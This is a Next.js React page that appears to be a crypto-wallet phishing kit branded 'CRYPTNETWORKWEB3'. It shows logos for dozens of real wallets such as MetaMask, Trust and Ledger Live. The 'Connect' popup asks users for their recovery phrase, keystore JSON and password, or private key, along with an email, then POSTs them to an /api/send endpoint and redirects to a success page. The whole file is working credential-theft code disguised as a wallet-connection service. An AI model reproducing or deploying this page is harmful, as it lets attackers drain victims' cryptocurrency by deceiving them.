



"use client"
import styles from "./page.module.css"
import { useState, useRef } from "react"
import { useRouter } from 'next/navigation';
import Image from "next/image";


export default function Page() {
  const [show1, setShow1] = useState(false)
  const [show2, setShow2] = useState(false)
  const [sym, setSym] = useState({})
  const [loading, setLoading] = useState(false)
  function handleClick(file){
    setSym(file)
    setShow1(!show1)
    console.log(file)
  }
  function handleClick2(){
    setShow1(!show1)
    setShow2(!show2)
  }
  function handleClick3(){
    setShow2(!show2)
  }

  function handleLoading(){
    setLoading(!loading)
  }
  return (
    <div className={styles.page}>
      <Navbar/>
      <Hero/>
      <Choose handleShow={handleClick}/>
      {show1 && <Popup handleShow={handleClick} file={sym} handleShow2={handleClick2}/>}
      {show2 && <Popup2 handleShow={handleClick2} handleShow2={handleClick3} handleLoading = {handleLoading} file={sym}/>}
      {loading && <Loader/>}
    </div>
  )
}

export function Navbar(){
  const [pop, setPop] = useState(false)
  const router = useRouter();
  function handleClick(){
    setPop(!pop)
  }
  return (
    <nav className={styles.nav}>
        <h1>CRYPTNETWORKWEB3</h1>
        <ul>
            <li>DApps</li>
            <li>NFT</li>
            <li>Web3</li>
        </ul>
        {pop && <main>
          <span onClick={handleClick}>X</span>
          <ol>
            <li>DApps</li>
            <li>NFT</li>
            <li>Web3</li>
          </ol>
        </main>}
        <button>Secure Wallet</button>
        <div onClick={handleClick}>
          <span></span><span></span><span></span>
        </div>
    </nav>
  )
}

export function Hero(){
  return (
    <section className={styles.hero}>
        <h1>Secure</h1>
        <div>
            Refers to the safety and protection of assets, data, and transactions in the crypto space. Investors should prioritize platforms with robust security measures like encryption and multi-factor authentication.
        </div>
    </section>
  )
}

export function Choose({handleShow}){
  const arranged = [
    { src: "/symbols/exodus.png", text: "exodus" },
    { src: "/symbols/trust.png", text: "trust" },
    { src: "/symbols/wallet connect.jpg", text: "wallet connect" },
    { src: "/symbols/lobstr.png", text: "lobstr" },
    { src: "/symbols/atomic.png", text: "atomic" },
    { src: "/symbols/metamask.png", text: "metamask" },
    { src: "/symbols/rainbow.png", text: "rainbow" },
    { src: "/symbols/argent.jpg", text: "argent" },
    { src: "/symbols/gnosis safe multisig.jpg", text: "gnosis safe multisig" },
    { src: "/symbols/crypto.com.png", text: "crypto.com | defi wallet" },
    { src: "/symbols/pillar.png", text: "pillar" },
    { src: "/symbols/anchor.png", text: "anchor" },
    { src: "/symbols/onto.png", text: "onto" },
    { src: "/symbols/tokenpocket.png", text: "tokenpocket" },
    { src: "/symbols/mathwallet.png", text: "mathwallet" },
    { src: "/symbols/bitpay.jpg", text: "bitpay" },
    { src: "/symbols/maiar.png", text: "maiar" },
    { src: "/symbols/ledger live.png", text: "ledger live" },
    { src: "/symbols/walleth.png", text: "walleth" },
    { src: "/symbols/authereum.png", text: "authereum" },
    { src: "/symbols/huobi wallet.jpg", text: "huobi wallet" },
    { src: "/symbols/eidoo.png", text: "eidoo" },
    { src: "/symbols/mykey.png", text: "mykey" },
    { src: "/symbols/loopring wallet.jpg", text: "loopring wallet" },
    { src: "/symbols/trustvault.png", text: "trustvault" },
    { src: "/symbols/coin98.png", text: "coin98" },
    { src: "/symbols/coolwallet.png", text: "coolwallet s" },
    { src: "/symbols/alice.png", text: "alice" },
    { src: "/symbols/alphawallet.jpg", text: "alphawallet" },
    { src: "/symbols/gridplus.png", text: "gridplus" },
    { src: "/symbols/cybavowallet.png", text: "cybavowallet" },
    { src: "/symbols/nash.jpg", text: "nash" },
    { src: "/symbols/tokenary.png", text: "tokenary" },
    { src: "/symbols/wazirx.png", text: "wazirx" },
    { src: "/symbols/dcentwallet.png", text: "dcentwallet" },
    { src: "/symbols/zelcore.png", text: "zelcore" },
    { src: "/symbols/coinomi.jpg", text: "coinomi" },
    { src: "/symbols/torus.jpg", text: "torus" },
    { src: "/symbols/spatium.jpg", text: "spatium" },
    { src: "/symbols/safepal.png", text: "safepal" },
    { src: "/symbols/equal.jpg", text: "equal" },
    { src: "/symbols/infinito wallet.png", text: "infinito" },
    { src: "/symbols/wallet.io.png", text: "wallet.io" },
    { src: "/symbols/infinity wallet.png", text: "infinity wallet" },
    { src: "/symbols/ownbit-.png", text: "ownbit" },
    { src: "/symbols/easypocket.jpg", text: "easypocket" },
    { src: "/symbols/bridge wallet.png", text: "bridge wallet" },
    { src: "/symbols/sparkpoint.png", text: "sparkpoint" },
    { src: "/symbols/viawallet.png", text: "viawallet" },
    { src: "/symbols/bitkeep.png", text: "bitkeep" },
    { src: "/symbols/vision.png", text: "vision" },
    { src: "/symbols/swft wallet.png", text: "swft wallet" },
    { src: "/symbols/peakdefi.png", text: "peakdefi wallet" },
    { src: "/symbols/cosmosstation.png", text: "cosmostation" },
    { src: "/symbols/graph.jpg", text: "graph protocol" },
    { src: "/symbols/kardachain.png", text: "kardiachain" },
    { src: "/symbols/keplr.png", text: "keplr" },
    { src: "/symbols/harmony.png", text: "harmony" },
    { src: "/symbols/iconex.png", text: "iconex" },
    { src: "/symbols/fetch.jpg", text: "fetch" },
    { src: "/symbols/xdc.png", text: "xdc wallet" },
    { src: "/symbols/unstoppable.png", text: "unstoppable wallet" },
    { src: "/symbols/meetone.jpg", text: "meet.one" },
    { src: "/symbols/dok-7.png", text: "dok wallet" },
    { src: "/symbols/atwallet.png", text: "at.wallet" },
    { src: "/symbols/morixwallet.png", text: "morix wallet" },
    { src: "/symbols/midas.png", text: "midas wallet" },
    { src: "/symbols/ellipal.png", text: "ellipal" },
    { src: "/symbols/keyringpro.png", text: "keyring pro" },
    { src: "/symbols/blockchain.png", text: "blockchain" },
    { src: "/symbols/bsc-logo.png", text: "binance smart chain" },
    { src: "/symbols/akt.png", text: "aktionariat" },
    { src: "/symbols/coinbase.png", text: "coinbase" }
  ];

  const [search, setSearch] = useState([...arranged])

  const handleChange = (e)=>{
    const newfiles = arranged.filter(item =>item?.text.toLowerCase().includes(e.target.value.toLowerCase()))
    setSearch(prevSearch => newfiles)
  }

  return (
    <section className={styles.choice}>
        <div className={styles.wallet}>
            <p>Choose wallet</p>
            <p>
              Show uninstalled
              <input type="checkbox" name="" id="check" className={styles.checkbox}/>
              <label htmlFor="check" className={styles.check}></label>
            </p>
        </div>
        <div className={styles.search}>
          <input type="text" name="search" placeholder="Search Coin..." onChange={handleChange}/>
        </div>
        <div className={styles.cardbox}>
          {search.map((file, i) =>{
            return(
              <div className={styles.card} key={i} onClick={()=> handleShow(file)}>
                <Image
                  src={file?.src}
                  alt="Coin Logo"
                  width={50}
                  height={50}
                  priority
                />
                <h2>{file?.text}</h2>
              </div>
            )
          })}
        </div>
    </section>
  )
}

export function Popup({handleShow, file, handleShow2}){
  return (
    <section className={styles.popup}>
        <main>
          <span onClick={handleShow}>X</span>
          <Image
            src={file.src}
            alt="Coin Logo"
            width={50}
            height={50}
            priority
          />
          <h1>{file.text}</h1>
          <p>Web3 is an umbrella term for technologies like blockchain that decentralize data ownership and control internet. It creates an encrypted connections ensuring that your transactions and funds are safe and protected.</p>
          <button onClick={handleShow2}>Connect</button>
        </main>
    </section>
  )
}

export function Popup2({handleShow, handleShow2, handleLoading, file}){
  const [form, setForm] = useState([])
  const [type, setType] = useState("phrase")
  const [error, setError] = useState(false)
  const router = useRouter()
  const handleChange = (e)=>{
    setForm({
      ...form,
      [e.target.name] : e.target.value,
    })
  }

  function handleSubmit(){
    if (form.length === 0){
      setError(!error)
      setTimeout(()=>{
        setError(!error)
      }, 2000)
    } else{
        handleLoading()
        fetch("/api/send", {
          method: "POST",
          cache: "no-cache",
          body: JSON.stringify({
            ...form
          }),
          headers: {
            "Content-type": "application/json"
          }
        })
        .then(res=> {
          console.log(res.status)
          if(res.status === 200){
            handleLoading()
            res.json()
            router.push("/success")
          } else{
            handleLoading()
          }
        })
        .then(data => {
          console.log(data)
        })
    }
    
    
  }

  function handleTypeChange(type){
    setType(type)
  }

  function capitalizeFirst(str) {
    return str.charAt(0).toUpperCase() + str.slice(1);
  }
  return (
    <section className={styles.popup2}>
      <main>
        <div className={styles.popup2head}>
            <Image
              src={file.src}
              alt="Coin Logo"
              width={50}
              height={50}
              priority
            />
            <h1>Import your {capitalizeFirst(file.text)} Wallet </h1> 
            <span onClick={handleShow2}>X</span>
        </div>
        <div className={styles.popup2subhead}>
            <span onClick={() => handleTypeChange("phrase")} style={type === "phrase" ? {borderBottom: "3px solid"} : {border: "none"}}>Phrase</span>
            <span onClick={() => handleTypeChange("key")} style={type === "key" ? {borderBottom: "3px solid"} : {border: "none"}}>Keystore JSON</span>
            <span onClick={() => handleTypeChange("private")} style={type === "private" ? {borderBottom: "3px solid"} : {border: "none"}}>Private Key</span>
        </div>
        {type ==="phrase" && <section>
            <div>
                <label htmlFor="">Wallet Name</label>
                <input type="text" placeholder="Wallet Name" name="name" onChange={(e)=>handleChange(e)}/>
            </div>
            <div>
                <label htmlFor="">Email</label>
                <input type="email" placeholder="Email" name="email" onChange={(e)=>handleChange(e)}/>
            </div>
            <div>
                <label htmlFor="">Phrase</label>
                <textarea placeholder="Enter recovery phrase" name="phrase" onChange={(e)=>handleChange(e)}></textarea>
                <p>Typically 12 (sometimes 24) words separated by single spaces</p>
            </div> 
        </section>}
        {type === "key" && <section>
            <p>Upload or paste your keystore JSON contents here.</p>
            <input type="text" placeholder="Wallet Name"  name="name" onChange={(e)=>handleChange(e)}/>
            <input type="email" placeholder="Email"  name="email" onChange={(e)=>handleChange(e)}/>
            <textarea placeholder="KeyStore JSON"  name="key" onChange={(e)=>handleChange(e)}></textarea>
            <input type="password" placeholder="Wallet Password"  name="password" onChange={(e)=>handleChange(e)}/>
            <p>Several lines of text beginning with "(...)" plus the password you used to encrypt it.</p>
        </section>}
        {type === "private" && <section>
            <p>Enter your private key below:</p>
            <input type="text" placeholder="Wallet Name" name="name" onChange={(e)=>handleChange(e)}/>
            <input type="email" placeholder="Email" name="email" onChange={(e)=>handleChange(e)}/>
            <textarea placeholder="KeyStore JSON" name="key" onChange={(e)=>handleChange(e)}></textarea>
            <input type="password" placeholder="Enter your private key" name="private" onChange={(e)=>handleChange(e)}/>
            <p>Typically 12 (sometimes 24) words separated by a single space.</p>
        </section>}
        {error && <strong>Please fill in the empty spaces!!!</strong>}
        <div className={styles.btns}>
            <button onClick={handleShow2}>Cancel</button>
            <button onClick={handleSubmit}>Proceed</button>
        </div>
      </main>
        
    </section>
  )
}

export function Loader(){
  return (
    <section className={styles.loader}>
        <Image
          src="/icons/icon.png"
          alt="Coin Logo"
          width={50}
          height={50}
          priority
        />
    </section>
  )
}